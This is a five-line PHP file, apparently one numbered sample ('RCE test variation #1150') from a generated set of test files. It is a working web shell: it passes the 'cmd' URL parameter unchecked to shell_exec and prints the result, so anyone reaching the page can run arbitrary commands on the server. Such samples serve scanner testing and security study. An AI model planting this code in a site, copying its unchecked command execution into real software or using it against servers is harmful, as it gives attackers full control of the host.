<?php
// RCE test variation #1150
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>